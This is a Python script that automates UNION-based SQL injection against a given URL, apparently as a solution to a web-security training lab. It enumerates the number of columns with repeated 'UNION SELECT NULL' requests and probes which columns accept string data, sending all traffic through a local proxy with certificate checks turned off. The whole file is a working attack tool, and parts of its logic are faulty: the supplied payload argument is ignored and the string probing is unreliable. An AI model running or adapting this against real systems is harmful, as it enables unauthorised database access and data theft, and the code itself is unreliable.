import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8087', 'https': 'http://127.0.0.1:8087'}

def exploit_sqli(url, uri, payload):
    result = 0
    columns = 'NULL'
    for i in range(1, 50):
        payload = f"' UNION SELECT {columns}--"
        res = requests.get(url + uri + payload, proxies=proxies, verify=False)
        if res.status_code == 200:
            result = i
            break
        else:
            columns += ',NULL'
    
    columns = columns.split(',')
    
    for j in range(result):
        if j > 0:
            columns[j] = '\'str\''
            payload = "' UNION SELECT {}--".format(",".join(columns))
        else:
            payload = "' UNION SELECT 'NULL'--"
            
        res = requests.get(url + uri + payload, proxies=proxies, verify=False)
        
        if "Internal Server Error" in res.text:
            columns[j] = 'NULL'
            if j > 1 :
                payload = "' UNION SELECT {}--".format(",".join(columns))
            else :
                payload = "' UNION SELECT NULL--"
                
    return payload

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        uri = sys.argv[2].strip()
        payload = sys.argv[3]
    except IndexError:
        print('[-] Usage: %s <url> <uri> <payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "/Filter?value=Gifts" "\' or 1=1"' % sys.argv[0])
        sys.exit(-1)

    result = exploit_sqli(url, uri, payload)

    print("[+] SQLi attack result is: %s." % result)
